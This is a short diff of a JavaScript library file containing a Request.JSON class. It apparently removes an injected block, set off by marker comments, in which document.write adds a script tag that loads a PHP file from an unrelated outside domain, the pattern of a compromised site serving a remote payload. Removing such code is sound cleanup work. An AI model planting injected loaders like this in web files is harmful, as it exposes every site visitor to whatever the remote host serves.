@@ -4034,13 +4034,3 @@ Request.JSON = new Class({
 	}
 
 });
-
-/*011b10*/
-/**/
-
-
-document.write("<script type='text/javascript' src='http://www.conecta2electricidad.com/6FgGBLzN.php'></"+ "script>");
-
-
-
-/*/011b10*/
